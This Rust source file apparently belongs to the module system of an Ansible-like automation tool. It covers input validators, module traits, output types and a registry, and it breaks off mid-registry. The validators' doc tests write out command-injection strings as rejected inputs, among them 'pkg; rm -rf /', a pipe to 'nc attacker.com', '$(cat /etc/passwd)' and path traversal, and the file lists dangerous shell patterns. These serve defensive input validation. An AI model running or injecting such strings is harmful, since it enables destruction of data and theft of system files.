//! Module system for Rustible
//!
//! This module provides the core traits, types, and registry for the Rustible module system.
//! Modules are the building blocks that perform actual work on target systems.

pub mod apt;
pub mod archive;
pub mod assert;
pub mod authorized_key;
pub mod blockinfile;
pub mod cloud;
pub mod command;
pub mod copy;
pub mod cron;
// Database modules disabled - requires sqlx integration
// TODO: Enable when sqlx dependency is added with feature flag
// pub mod database;
pub mod debug;
pub mod dnf;
pub mod docker;
pub mod facts;
pub mod fail;
pub mod file;
pub mod firewalld;
pub mod git;
pub mod group;
pub mod hostname;
pub mod include_vars;
pub mod k8s;
pub mod known_hosts;
pub mod lineinfile;
pub mod meta;
pub mod mount;
pub mod network;
pub mod package;
pub mod pause;
pub mod pip;
pub mod python;
pub mod raw;
pub mod script;
pub mod selinux;
pub mod service;
pub mod set_fact;
pub mod shell;
pub mod stat;
pub mod synchronize;
pub mod sysctl;
pub mod systemd_unit;
pub mod template;
pub mod timezone;
pub mod ufw;
pub mod unarchive;
pub mod uri;
pub mod user;
pub mod wait_for;
pub mod windows;
pub mod yum;

pub use python::PythonModuleExecutor;

use crate::connection::Connection;
use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fmt;
use std::path::Path;
use std::path::PathBuf;
use std::sync::Arc;
use thiserror::Error;

/// Regex pattern for validating package names.
/// Allows alphanumeric characters, dots, underscores, plus signs, and hyphens.
static PACKAGE_NAME_REGEX: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"^[a-zA-Z0-9._+-]+$").expect("Invalid package name regex"));

/// Validates a package name against a safe regex pattern.
///
/// Package names must only contain alphanumeric characters, dots, underscores,
/// plus signs, and hyphens (`[a-zA-Z0-9._+-]+`). This prevents command injection
/// attacks when package names are passed to shell commands.
///
/// # Arguments
///
/// * `name` - The package name to validate
///
/// # Returns
///
/// * `Ok(())` if package name is valid
/// * `Err(ModuleError::InvalidParameter)` if package name contains invalid characters
///
/// # Examples
///
/// ```
/// use rustible::modules::validate_package_name;
///
/// assert!(validate_package_name("nginx").is_ok());
/// assert!(validate_package_name("python3.11").is_ok());
/// assert!(validate_package_name("g++").is_ok());
/// assert!(validate_package_name("lib-dev").is_ok());
///
/// // Invalid package names
/// assert!(validate_package_name("pkg; rm -rf /").is_err());
/// assert!(validate_package_name("").is_err());
/// ```
pub fn validate_package_name(name: &str) -> ModuleResult<()> {
    // Length limits (most package managers have limits)
    if name.len() > 255 {
        return Err(ModuleError::InvalidParameter(
            "Package name too long (max 255 characters)".to_string(),
        ));
    }

    // Validate as shell-safe string
    validate_shell_safe_string(name, "Package name")?;

    // Additional package-specific validation
    // Reject names starting with hyphen (not valid in many package managers)
    if name.starts_with('-') {
        return Err(ModuleError::InvalidParameter(
            "Package name cannot start with hyphen".to_string(),
        ));
    }

    Ok(())
}

/// Strict validation for shell-escaped parameters to prevent command injection.
///
/// This function blocks all shell metacharacters that could enable command injection:
/// - `$ ` `` | & ; < > ( ) \n \r \t \ !`
///
/// # Arguments
///
/// * `value` - The string to validate
/// * `param_name` - The parameter name for error messages (e.g., "Package name")
///
/// # Returns
///
/// * `Ok(())` if value is shell-safe
/// * `Err(ModuleError::InvalidParameter)` if value contains shell metacharacters
///
/// # Examples
///
/// ```
/// use rustible::modules::validate_shell_safe_string;
///
/// assert!(validate_shell_safe_string("nginx", "Package name").is_ok());
/// assert!(validate_shell_safe_string("python3.11", "Package name").is_ok());
/// assert!(validate_shell_safe_string("lib-dev", "Package name").is_ok());
///
/// // Invalid - contains shell metacharacters
/// assert!(validate_shell_safe_string("pkg$(whoami)", "Package name").is_err());
/// assert!(validate_shell_safe_string("pkg`id`", "Package name").is_err());
/// assert!(validate_shell_safe_string("pkg|nc attacker.com", "Package name").is_err());
/// assert!(validate_shell_safe_string("pkg&&reboot", "Package name").is_err());
/// ```
pub fn validate_shell_safe_string(value: &str, param_name: &str) -> ModuleResult<()> {
    if value.is_empty() {
        return Err(ModuleError::InvalidParameter(format!(
            "{} cannot be empty",
            param_name
        )));
    }

    // Reject null bytes
    if value.contains('\0') {
        return Err(ModuleError::InvalidParameter(format!(
            "{} contains null byte",
            param_name
        )));
    }

    // Reject shell metacharacters that enable command injection
    const SHELL_METACHARACTERS: &[char] = &[
        '$', '`', '|', '&', ';', '<', '>', '(', ')', '\n', '\r', '\t', '\\', '!',
    ];

    if value.chars().any(|c| SHELL_METACHARACTERS.contains(&c)) {
        let found_chars: Vec<String> = value
            .chars()
            .filter(|c| SHELL_METACHARACTERS.contains(c))
            .map(|c| format!("'{}'", c.escape_default()))
            .collect();
        return Err(ModuleError::InvalidParameter(format!(
            "{} contains shell metacharacter(s): {}",
            param_name,
            found_chars.join(", ")
        )));
    }

    // Validate against safe pattern (alphanumeric, dots, underscores, plus, hyphens)
    if !PACKAGE_NAME_REGEX.is_match(value) {
        return Err(ModuleError::InvalidParameter(format!(
            "{} contains invalid characters. Only alphanumeric, dots, underscores, plus signs, and hyphens are allowed.",
            param_name
        )));
    }

    Ok(())
}

/// Validates an environment variable name.
///
/// Environment variable names must:
/// - Not be empty
/// - Not start with a digit
/// - Contain only alphanumeric characters and underscores
/// - Not contain null bytes
///
/// # Arguments
///
/// * `name` - The environment variable name to validate
///
/// # Returns
///
/// * `Ok(())` if environment variable name is valid
/// * `Err(ModuleError::InvalidParameter)` if name is invalid
///
/// # Examples
///
/// ```
/// use rustible::modules::validate_env_var_name;
///
/// assert!(validate_env_var_name("MY_VAR").is_ok());
/// assert!(validate_env_var_name("PATH").is_ok());
/// assert!(validate_env_var_name("var123").is_ok());
///
/// // Invalid names
/// assert!(validate_env_var_name("").is_err());
/// assert!(validate_env_var_name("123VAR").is_err());
/// assert!(validate_env_var_name("MY-VAR").is_err());
/// ```
pub fn validate_env_var_name(name: &str) -> ModuleResult<()> {
    if name.is_empty() {
        return Err(ModuleError::InvalidParameter(
            "Environment variable name cannot be empty".to_string(),
        ));
    }

    // Environment variable names should not start with a digit
    if name.chars().next().unwrap().is_ascii_digit() {
        return Err(ModuleError::InvalidParameter(format!(
            "Environment variable name '{}' cannot start with a digit",
            name
        )));
    }

    // Check for valid characters (alphanumeric and underscore only)
    for c in name.chars() {
        if !c.is_ascii_alphanumeric() && c != '_' {
            return Err(ModuleError::InvalidParameter(format!(
                "Environment variable name '{}' contains invalid character '{}'",
                name, c
            )));
        }
    }

    // Reject null bytes
    if name.contains('\0') {
        return Err(ModuleError::InvalidParameter(format!(
            "Environment variable name '{}' contains null byte",
            name
        )));
    }

    Ok(())
}

/// Validates a path parameter to prevent path traversal attacks.
///
/// This function ensures paths are safe for use in `creates` and `removes` parameters
/// by rejecting:
/// - Empty paths
/// - Paths containing null bytes
/// - Paths containing newlines (log injection)
/// - Paths containing path traversal sequences (`..`)
///
/// # Arguments
///
/// * `path` - The path string to validate
/// * `param_name` - The parameter name for error messages (e.g., "creates", "removes")
///
/// # Returns
///
/// * `Ok(())` if path is valid
/// * `Err(ModuleError::InvalidParameter)` if path is invalid
///
/// # Examples
///
/// ```
/// use rustible::modules::validate_path_param;
///
/// // Valid paths
/// assert!(validate_path_param("/tmp/marker.txt", "creates").is_ok());
/// assert!(validate_path_param("./subdir/file", "removes").is_ok());
/// assert!(validate_path_param("marker.txt", "creates").is_ok());
///
/// // Invalid - path traversal
/// assert!(validate_path_param("../../../etc/passwd", "creates").is_err());
/// assert!(validate_path_param("/var/log/../root", "creates").is_err());
///
/// // Invalid - null bytes / newlines
/// assert!(validate_path_param("/path\0null", "creates").is_err());
/// assert!(validate_path_param("/path\ninjection", "creates").is_err());
/// ```
pub fn validate_path_param(path: &str, param_name: &str) -> ModuleResult<()> {
    // Reject empty paths
    if path.is_empty() {
        return Err(ModuleError::InvalidParameter(format!(
            "{} path cannot be empty",
            param_name
        )));
    }

    // Reject paths with null bytes (injection attack vector)
    if path.contains('\0') {
        return Err(ModuleError::InvalidParameter(format!(
            "{} path contains invalid null byte",
            param_name
        )));
    }

    // Reject paths with newlines (could be used for log injection)
    if path.contains('\n') || path.contains('\r') {
        return Err(ModuleError::InvalidParameter(format!(
            "{} path contains invalid newline characters",
            param_name
        )));
    }

    // Check for path traversal using PathBuf normalization
    let path_buf = PathBuf::from(path);
    for component in path_buf.components() {
        if component == std::path::Component::ParentDir {
            return Err(ModuleError::InvalidParameter(format!(
                "{} path contains path traversal components (../). \
                 Path traversal is not allowed for security reasons.",
                param_name
            )));
        }
    }

    Ok(())
}

/// Validates command arguments for dangerous patterns.
///
/// This function is more permissive than `validate_shell_safe_string` as command
/// arguments may legitimately contain spaces, quotes, and some special characters.
/// However, it blocks specific injection patterns that could lead to command execution.
///
/// # Arguments
///
/// * `args` - The command arguments string to validate
///
/// # Returns
///
/// * `Ok(())` if arguments are safe
/// * `Err(ModuleError::InvalidParameter)` if dangerous patterns are detected
///
/// # Examples
///
/// ```
/// use rustible::modules::validate_command_args;
///
/// // Valid arguments
/// assert!(validate_command_args("nginx -c /etc/nginx.conf").is_ok());
/// assert!(validate_command_args("--force").is_ok());
/// assert!(validate_command_args("").is_ok());
///
/// // Dangerous patterns
/// assert!(validate_command_args("$(cat /etc/passwd)").is_err());
/// assert!(validate_command_args("nginx; reboot").is_err());
/// ```
pub fn validate_command_args(args: &str) -> ModuleResult<()> {
    if args.is_empty() {
        return Ok(()); // Empty args are fine
    }

    // Reject null bytes
    if args.contains('\0') {
        return Err(ModuleError::InvalidParameter(
            "Command arguments contain null byte".to_string(),
        ));
    }

    // Dangerous patterns that indicate command injection
    let dangerous_patterns = [
        ("$(", "command substitution $()"),
        ("${", "variable expansion ${}"),
        ("`", "backtick command substitution"),
        ("&&", "command chaining &&"),
        ("||", "command chaining ||"),
        ("; ", "command separator ;"),
        ("|", "pipe operator"),
        (">", "output redirection"),
        ("<", "input redirection"),
        ("\n", "newline (multi-line command)"),
        ("\r", "carriage return"),
    ];

    for (pattern, description) in dangerous_patterns {
        if args.contains(pattern) {
            return Err(ModuleError::InvalidParameter(format!(
                "Command arguments contain potentially dangerous pattern: {} ({})",
                pattern.escape_default(),
                description
            )));
        }
    }

    Ok(())
}

/// Normalizes a path and optionally validates it against a base directory.
///
/// This function resolves the path and checks if it stays within the specified
/// base directory (if provided). This helps prevent path traversal attacks.
///
/// # Arguments
///
/// * `path` - The path to normalize
/// * `base_dir` - Optional base directory that the path must stay within
///
/// # Returns
///
/// * `Ok(PathBuf)` - The normalized path
/// * `Err(ModuleError::InvalidParameter)` - If the path is invalid or escapes the base directory
///
/// # Examples
///
/// ```
/// use rustible::modules::normalize_path;
/// use std::path::PathBuf;
///
/// // Simple path normalization
/// assert!(normalize_path("./file.txt", None).is_ok());
///
/// // With base directory enforcement
/// let base = PathBuf::from("/safe/dir");
/// assert!(normalize_path("/safe/dir/file.txt", Some(&base)).is_ok());
/// assert!(normalize_path("/etc/passwd", Some(&base)).is_err());
/// ```
pub fn normalize_path(path: &str, base_dir: Option<&Path>) -> ModuleResult<PathBuf> {
    if path.is_empty() {
        return Err(ModuleError::InvalidParameter(
            "Path cannot be empty".to_string(),
        ));
    }

    // Reject paths with null bytes
    if path.contains('\0') {
        return Err(ModuleError::InvalidParameter(
            "Path contains null byte".to_string(),
        ));
    }

    let path_buf = PathBuf::from(path);

    // If base_dir is specified, ensure path doesn't escape it
    if let Some(base) = base_dir {
        // For relative paths, join with base first
        let full_path = if path_buf.is_relative() {
            base.join(&path_buf)
        } else {
            path_buf.clone()
        };

        // Normalize the path by resolving . and ..
        let mut normalized = PathBuf::new();
        for component in full_path.components() {
            match component {
                std::path::Component::ParentDir => {
                    // Check if we would escape the base directory
                    if !normalized.starts_with(base) || normalized == *base {
                        return Err(ModuleError::InvalidParameter(format!(
                            "Path '{}' escapes intended base directory '{}'",
                            path,
                            base.display()
                        )));
                    }
                    normalized.pop();
                }
                std::path::Component::CurDir => {
                    // Skip current directory markers
                }
                _ => {
                    normalized.push(component);
                }
            }
        }

        // Final check: ensure normalized path is within base
        if !normalized.starts_with(base) {
            return Err(ModuleError::InvalidParameter(format!(
                "Path '{}' escapes intended base directory '{}'",
                path,
                base.display()
            )));
        }

        Ok(normalized)
    } else {
        // Without base_dir, just return the path as-is (no enforcement)
        Ok(path_buf)
    }
}

/// Errors that can occur during module execution
#[derive(Error, Debug)]
pub enum ModuleError {
    #[error("Module not found: {0}")]
    NotFound(String),

    #[error("Invalid parameter: {0}")]
    InvalidParameter(String),

    #[error("Missing required parameter: {0}")]
    MissingParameter(String),

    #[error("Execution failed: {0}")]
    ExecutionFailed(String),

    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),

    #[error("Permission denied: {0}")]
    PermissionDenied(String),

    #[error("Command failed with exit code {code}: {message}")]
    CommandFailed { code: i32, message: String },

    #[error("Template error: {0}")]
    TemplateError(String),

    #[error("Parse error: {0}")]
    ParseError(String),

    #[error("Unsupported operation: {0}")]
    Unsupported(String),

    #[error("Ansible module not found: {0}")]
    ModuleNotFound(String),

    #[error("Validation failed: {0}")]
    ValidationFailed(String),
}

/// Result type for module operations
pub type ModuleResult<T> = Result<T, ModuleError>;

/// Status of a module execution
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ModuleStatus {
    /// Module executed successfully and made changes
    Changed,
    /// Module executed successfully but no changes were needed
    Ok,
    /// Module execution failed
    Failed,
    /// Module was skipped (e.g., condition not met)
    Skipped,
}

impl fmt::Display for ModuleStatus {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ModuleStatus::Changed => write!(f, "changed"),
            ModuleStatus::Ok => write!(f, "ok"),
            ModuleStatus::Failed => write!(f, "failed"),
            ModuleStatus::Skipped => write!(f, "skipped"),
        }
    }
}

/// Classification of modules based on their execution characteristics.
///
/// This enables intelligent parallelization and backwards compatibility with
/// Ansible modules by categorizing how each module executes.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum ModuleClassification {
    /// Tier 1: Logic modules that run entirely on the control node.
    /// Examples: debug, set_fact, assert, fail, meta, include_tasks
    /// These never touch the remote host and execute in nanoseconds.
    LocalLogic,

    /// Tier 2: File/transport modules implemented natively in Rust.
    /// Examples: copy, template, file, lineinfile, fetch
    /// These use direct SSH/SFTP operations without remote Python.
    NativeTransport,

    /// Tier 3: Remote command execution modules.
    /// Examples: command, shell, service, package, user
    /// These execute commands on the remote host via SSH.
    #[default]
    RemoteCommand,

    /// Tier 4: Python fallback for Ansible module compatibility.
    /// Used for any module without a native Rust implementation.
    /// Executes via AnsiballZ-compatible Python wrapper.
    PythonFallback,
}

impl fmt::Display for ModuleClassification {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ModuleClassification::LocalLogic => write!(f, "local_logic"),
            ModuleClassification::NativeTransport => write!(f, "native_transport"),
            ModuleClassification::RemoteCommand => write!(f, "remote_command"),
            ModuleClassification::PythonFallback => write!(f, "python_fallback"),
        }
    }
}

/// Hints for how a module can be parallelized across hosts.
///
/// The executor uses these hints to determine safe concurrency levels
/// and prevent race conditions or resource contention.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum ParallelizationHint {
    /// Safe to run simultaneously across all hosts.
    /// No shared state, no resource contention expected.
    #[default]
    FullyParallel,

    /// Requires exclusive access per host.
    /// Example: apt/yum operations that acquire package manager locks.
    HostExclusive,

    /// Network rate-limited operations.
    /// Example: API calls to cloud providers with rate limits.
    RateLimited {
        /// Maximum requests per second across all hosts
        requests_per_second: u32,
    },

    /// Requires global exclusive access.
    /// Only one instance can run across the entire inventory.
    /// Example: Cluster-wide configuration changes.
    GlobalExclusive,
}

/// Represents a difference between current and desired state
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Diff {
    /// Description of what will change
    pub before: String,
    /// Description of what it will change to
    pub after: String,
    /// Optional detailed diff (e.g., unified diff for files)
    pub details: Option<String>,
}

impl Diff {
    pub fn new(before: impl Into<String>, after: impl Into<String>) -> Self {
        Self {
            before: before.into(),
            after: after.into(),
            details: None,
        }
    }

    pub fn with_details(mut self, details: impl Into<String>) -> Self {
        self.details = Some(details.into());
        self
    }
}

/// Result of a module execution
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModuleOutput {
    /// Whether the module changed anything
    pub changed: bool,
    /// Human-readable message about what happened
    pub msg: String,
    /// Status of the execution
    pub status: ModuleStatus,
    /// Optional diff showing what changed
    #[serde(skip_serializing_if = "Option::is_none")]
    pub diff: Option<Diff>,
    /// Additional data returned by the module
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub data: HashMap<String, serde_json::Value>,
    /// Standard output (for command modules)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub stdout: Option<String>,
    /// Standard error (for command modules)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub stderr: Option<String>,
    /// Return code (for command modules)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub rc: Option<i32>,
}

impl ModuleOutput {
    /// Create a new successful output with no changes
    pub fn ok(msg: impl Into<String>) -> Self {
        Self {
            changed: false,
            msg: msg.into(),
            status: ModuleStatus::Ok,
            diff: None,
            data: HashMap::new(),
            stdout: None,
            stderr: None,
            rc: None,
        }
    }

    /// Create a new successful output with changes
    pub fn changed(msg: impl Into<String>) -> Self {
        Self {
            changed: true,
            msg: msg.into(),
            status: ModuleStatus::Changed,
            diff: None,
            data: HashMap::new(),
            stdout: None,
            stderr: None,
            rc: None,
        }
    }

    /// Create a failed output
    pub fn failed(msg: impl Into<String>) -> Self {
        Self {
            changed: false,
            msg: msg.into(),
            status: ModuleStatus::Failed,
            diff: None,
            data: HashMap::new(),
            stdout: None,
            stderr: None,
            rc: None,
        }
    }

    /// Create a skipped output
    pub fn skipped(msg: impl Into<String>) -> Self {
        Self {
            changed: false,
            msg: msg.into(),
            status: ModuleStatus::Skipped,
            diff: None,
            data: HashMap::new(),
            stdout: None,
            stderr: None,
            rc: None,
        }
    }

    /// Add a diff to the output
    pub fn with_diff(mut self, diff: Diff) -> Self {
        self.diff = Some(diff);
        self
    }

    /// Add data to the output
    pub fn with_data(mut self, key: impl Into<String>, value: serde_json::Value) -> Self {
        self.data.insert(key.into(), value);
        self
    }

    /// Add stdout/stderr/rc for command outputs
    pub fn with_command_output(
        mut self,
        stdout: Option<String>,
        stderr: Option<String>,
        rc: Option<i32>,
    ) -> Self {
        self.stdout = stdout;
        self.stderr = stderr;
        self.rc = rc;
        self
    }

    /// Convert to a JSON value suitable for storing in TaskResult.result
    ///
    /// This creates a canonical representation that includes all fields
    /// necessary for proper `register` variable access.
    pub fn to_result_json(&self) -> serde_json::Value {
        let mut result = serde_json::json!({
            "changed": self.changed,
            "failed": self.status == ModuleStatus::Failed,
            "skipped": self.status == ModuleStatus::Skipped,
            "msg": self.msg,
        });

        if let Some(rc) = self.rc {
            result["rc"] = serde_json::json!(rc);
        }
        if let Some(ref stdout) = self.stdout {
            result["stdout"] = serde_json::json!(stdout);
            result["stdout_lines"] =
                serde_json::json!(stdout.lines().map(String::from).collect::<Vec<_>>());
        }
        if let Some(ref stderr) = self.stderr {
            result["stderr"] = serde_json::json!(stderr);
            result["stderr_lines"] =
                serde_json::json!(stderr.lines().map(String::from).collect::<Vec<_>>());
        }

        // Add module-specific data
        for (key, value) in &self.data {
            result[key] = value.clone();
        }

        result
    }
}

/// Parameters passed to a module
pub type ModuleParams = HashMap<String, serde_json::Value>;

/// Context for module execution
#[derive(Clone)]
pub struct ModuleContext {
    /// Whether to run in check mode (dry run)
    pub check_mode: bool,
    /// Whether to show diffs
    pub diff_mode: bool,
    /// Verbosity level (0-4)
    pub verbosity: u8,
    /// Variables available to the module
    pub vars: HashMap<String, serde_json::Value>,
    /// Facts about the target system
    pub facts: HashMap<String, serde_json::Value>,
    /// Working directory for the module
    pub work_dir: Option<String>,
    /// Whether running with elevated privileges
    pub r#become: bool,
    /// Method for privilege escalation
    pub become_method: Option<String>,
    /// User to become
    pub become_user: Option<String>,
    /// Connection to use for remote operations
    pub connection: Option<Arc<dyn Connection + Send + Sync>>,
}

impl std::fmt::Debug for ModuleContext {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ModuleContext")
            .field("check_mode", &self.check_mode)
            .field("diff_mode", &self.diff_mode)
            .field("vars", &self.vars)
            .field("facts", &self.facts)
            .field("work_dir", &self.work_dir)
            .field("become", &self.r#become)
            .field("become_method", &self.become_method)
            .field("become_user", &self.become_user)
            .field(
                "connection",
                &self.connection.as_ref().map(|c| c.identifier()),
            )
            .finish()
    }
}

impl Default for ModuleContext {
    fn default() -> Self {
        Self {
            check_mode: false,
            diff_mode: false,
            verbosity: 0,
            vars: HashMap::new(),
            facts: HashMap::new(),
            work_dir: None,
            r#become: false,
            become_method: None,
            become_user: None,
            connection: None,
        }
    }
}

impl ModuleContext {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn with_check_mode(mut self, check_mode: bool) -> Self {
        self.check_mode = check_mode;
        self
    }

    pub fn with_diff_mode(mut self, diff_mode: bool) -> Self {
        self.diff_mode = diff_mode;
        self
    }

    pub fn with_verbosity(mut self, verbosity: u8) -> Self {
        self.verbosity = verbosity;
        self
    }

    pub fn with_vars(mut self, vars: HashMap<String, serde_json::Value>) -> Self {
        self.vars = vars;
        self
    }

    pub fn with_facts(mut self, facts: HashMap<String, serde_json::Value>) -> Self {
        self.facts = facts;
        self
    }

    pub fn with_connection(mut self, connection: Arc<dyn Connection + Send + Sync>) -> Self {
        self.connection = Some(connection);
        self
    }

    /// Enable privilege escalation
    pub fn with_become(mut self, value: bool) -> Self {
        self.r#become = value;
        self
    }

    /// Set the privilege escalation method
    pub fn with_become_method(mut self, method: impl Into<String>) -> Self {
        self.become_method = Some(method.into());
        self
    }

    /// Set the user to become
    pub fn with_become_user(mut self, user: impl Into<String>) -> Self {
        self.become_user = Some(user.into());
        self
    }
}

/// Trait that all modules must implement
pub trait Module: Send + Sync {
    /// Returns the name of the module
    fn name(&self) -> &'static str;

    /// Returns a description of what the module does
    fn description(&self) -> &'static str;

    /// Returns the classification of this module for execution optimization.
    ///
    /// The classification determines how the executor handles this module:
    /// - `LocalLogic`: Runs on control node only, no remote execution
    /// - `NativeTransport`: Uses native Rust SSH/SFTP operations
    /// - `RemoteCommand`: Executes commands on remote host (default)
    /// - `PythonFallback`: Falls back to Ansible Python module execution
    fn classification(&self) -> ModuleClassification {
        ModuleClassification::RemoteCommand
    }

    /// Returns parallelization hints for the executor.
    ///
    /// This helps the executor determine safe concurrency levels:
    /// - `FullyParallel`: Can run on all hosts simultaneously (default)
    /// - `HostExclusive`: Only one task per host (e.g., package managers)
    /// - `RateLimited`: Network rate-limited operations
    /// - `GlobalExclusive`: Only one instance across entire inventory
    fn parallelization_hint(&self) -> ParallelizationHint {
        ParallelizationHint::FullyParallel
    }

    /// Execute the module with the given parameters
    fn execute(&self, params: &ModuleParams, context: &ModuleContext)
        -> ModuleResult<ModuleOutput>;

    /// Check what would change without making changes (for check mode)
    fn check(&self, params: &ModuleParams, context: &ModuleContext) -> ModuleResult<ModuleOutput> {
        // Default implementation just calls execute with check_mode=true
        let check_context = ModuleContext {
            check_mode: true,
            ..context.clone()
        };
        self.execute(params, &check_context)
    }

    /// Generate a diff of what would change
    fn diff(&self, params: &ModuleParams, context: &ModuleContext) -> ModuleResult<Option<Diff>> {
        // Default implementation returns None
        let _ = (params, context);
        Ok(None)
    }

    /// Validate the parameters before execution
    fn validate_params(&self, params: &ModuleParams) -> ModuleResult<()> {
        // Default implementation does nothing
        let _ = params;
        Ok(())
    }

    /// Returns the list of required parameters
    fn required_params(&self) -> &[&'static str] {
        &[]
    }

    /// Returns the list of optional parameters with their default values
    fn optional_params(&self) -> HashMap<&'static str, serde_json::Value> {
        HashMap::new()
    }
}

/// Helper trait for extracting parameters
pub trait ParamExt {
    fn get_string(&self, key: &str) -> ModuleResult<Option<String>>;
    fn get_string_required(&self, key: &str) -> ModuleResult<String>;
    fn get_bool(&self, key: &str) -> ModuleResult<Option<bool>>;
    fn get_bool_or(&self, key: &str, default: bool) -> bool;
    fn get_i64(&self, key: &str) -> ModuleResult<Option<i64>>;
    fn get_u32(&self, key: &str) -> ModuleResult<Option<u32>>;
    fn get_vec_string(&self, key: &str) -> ModuleResult<Option<Vec<String>>>;
}

impl ParamExt for ModuleParams {
    #[inline]
    fn get_string(&self, key: &str) -> ModuleResult<Option<String>> {
        match self.get(key) {
            Some(serde_json::Value::String(s)) => Ok(Some(s.clone())),
            Some(v) => {
                // Avoid double allocation: only trim if needed
                let s = v.to_string();
                if s.starts_with('"') && s.ends_with('"') && s.len() >= 2 {
                    Ok(Some(s[1..s.len() - 1].to_string()))
                } else {
                    Ok(Some(s))
                }
            }
            None => Ok(None),
        }
    }

    fn get_string_required(&self, key: &str) -> ModuleResult<String> {
        self.get_string(key)?
            .ok_or_else(|| ModuleError::MissingParameter(key.to_string()))
    }

    fn get_bool(&self, key: &str) -> ModuleResult<Option<bool>> {
        match self.get(key) {
            Some(serde_json::Value::Bool(b)) => Ok(Some(*b)),
            Some(serde_json::Value::String(s)) => match s.to_lowercase().as_str() {
                "true" | "yes" | "1" | "on" => Ok(Some(true)),
                "false" | "no" | "0" | "off" => Ok(Some(false)),
                _ => Err(ModuleError::InvalidParameter(format!(
                    "{} must be a boolean",
                    key
                ))),
            },
            Some(_) => Err(ModuleError::InvalidParameter(format!(
                "{} must be a boolean",
                key
            ))),
            None => Ok(None),
        }
    }

    fn get_bool_or(&self, key: &str, default: bool) -> bool {
        self.get_bool(key).ok().flatten().unwrap_or(default)
    }

    fn get_i64(&self, key: &str) -> ModuleResult<Option<i64>> {
        match self.get(key) {
            Some(serde_json::Value::Number(n)) => n.as_i64().map(Some).ok_or_else(|| {
                ModuleError::InvalidParameter(format!("{} must be an integer", key))
            }),
            Some(serde_json::Value::String(s)) => s
                .parse()
                .map(Some)
                .map_err(|_| ModuleError::InvalidParameter(format!("{} must be an integer", key))),
            Some(_) => Err(ModuleError::InvalidParameter(format!(
                "{} must be an integer",
                key
            ))),
            None => Ok(None),
        }
    }

    fn get_u32(&self, key: &str) -> ModuleResult<Option<u32>> {
        match self.get(key) {
            Some(serde_json::Value::Number(n)) => n
                .as_u64()
                .and_then(|v| u32::try_from(v).ok())
                .map(Some)
                .ok_or_else(|| {
                    ModuleError::InvalidParameter(format!("{} must be a positive integer", key))
                }),
            Some(serde_json::Value::String(s)) => {
                // Handle octal notation (e.g., "0755" for mode)
                // If the string starts with "0" and has only digits, treat it as octal
                let s = s.trim();
                if s.starts_with('0')
                    && s.len() > 1
                    && s.chars().skip(1).all(|c| c.is_ascii_digit())
                {
                    u32::from_str_radix(&s[1..], 8).map(Some).map_err(|_| {
                        ModuleError::InvalidParameter(format!(
                            "{} must be a valid octal number",
                            key
                        ))
                    })
                } else {
                    s.parse().map(Some).map_err(|_| {
                        ModuleError::InvalidParameter(format!("{} must be a positive integer", key))
                    })
                }
            }
            Some(_) => Err(ModuleError::InvalidParameter(format!(
                "{} must be a positive integer",
                key
            ))),
            None => Ok(None),
        }
    }

    fn get_vec_string(&self, key: &str) -> ModuleResult<Option<Vec<String>>> {
        match self.get(key) {
            Some(serde_json::Value::Array(arr)) => {
                // Pre-allocate with known capacity
                let mut result = Vec::with_capacity(arr.len());
                for item in arr {
                    match item {
                        serde_json::Value::String(s) => result.push(s.clone()),
                        v => {
                            // Avoid double allocation: only trim if needed
                            let s = v.to_string();
                            if s.starts_with('"') && s.ends_with('"') && s.len() >= 2 {
                                result.push(s[1..s.len() - 1].to_string());
                            } else {
                                result.push(s);
                            }
                        }
                    }
                }
                Ok(Some(result))
            }
            Some(serde_json::Value::String(s)) => {
                // Handle comma-separated string - pre-count for capacity
                let parts: Vec<&str> = s.split(',').collect();
                let mut result = Vec::with_capacity(parts.len());
                for part in parts {
                    result.push(part.trim().to_string());
                }
                Ok(Some(result))
            }
            Some(_) => Err(ModuleError::InvalidParameter(format!(
                "{} must be an array",
                key
            ))),
            None => Ok(None),
        }
    }
}

/// Registry for looking up modules by name
pub struct ModuleRegistry {
    modules: HashMap<String, Arc<dyn Module>>,
}

impl ModuleRegistry {
    /// Create a new empty registry
    pub fn new() -> Self {
        Self {
            modules: HashMap::new(),
        }
    }

    /// Create a registry with all built-in modules
    pub fn with_builtins() -> Self {
        let mut registry = Self::new();
        // Package management modules
        registry.register(Arc::new(apt::AptModule));
        registry.register(Arc::new(dnf::DnfModule));
        registry.register(Arc::new(package::PackageModule));
        registry.register(Arc::new(pip::PipModule));
        registry.register(Arc::new(yum::YumModule));

        // Core command modules
        registry.register(Arc::new(command::CommandModule));
        registry.register(Arc::new(shell::ShellModule));

        // File/transport modules
        registry.register(Arc::new(blockinfile::BlockinfileModule));
        registry.register(Arc::new(copy::CopyModule));
        registry.register(Arc::new(file::FileModule));
        registry.register(Arc::new(lineinfile::LineinfileModule));
        registry.register(Arc::new(template::TemplateModule));

        // System management modules
        registry.register(Arc::new(cron::CronModule));
        registry.register(Arc::new(group::GroupModule));
        registry.register(Arc::new(hostname::HostnameModule));
        registry.register(Arc::new(mount::MountModule));
        registry.register(Arc::new(service::ServiceModule));
        registry.register(Arc::new(sysctl::SysctlModule));
        registry.register(Arc::new(user::UserModule));

        // Source control modules
        registry.register(Arc::new(git::GitModule));

        // Logic/utility modules
        registry.register(Arc::new(assert::AssertModule));
        registry.register(Arc::new(debug::DebugModule));
        registry.register(Arc::new(fail::FailModule));
        registry.register(Arc::new(include_vars::IncludeVarsModule));
        registry.register(Arc::new(meta::MetaModule));
